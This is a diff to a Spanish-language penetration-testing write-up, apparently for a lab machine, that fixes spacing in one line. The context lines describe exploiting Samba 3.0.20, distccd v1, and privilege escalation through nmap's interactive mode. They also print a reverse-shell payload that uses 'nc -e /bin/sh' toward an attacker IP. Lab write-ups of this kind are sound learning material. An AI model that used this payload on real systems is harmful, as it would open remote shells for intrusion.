@@ -8,4 +8,4 @@ Encontramos la **versión** de **Samba 3.0.20** la cuál es **vulnerable** y pod
 Con el comando siguiente: **"./=`nohup nc -e /bin/sh 10.10.14.24 443`"**
 No se observa correctamente el comando, falta ` `
 Por otro enfoque, encontramos que el puerto **3632 distccd v1** es vulnerable, y con nmap haremos esa comprobación.
-En la fase de **post-explotación**, haremos uso de **nmap ** y su funcionalidad** --interactive**.
+En la fase de **post-explotación**, haremos uso de **nmap** y su funcionalidad** --interactive**.
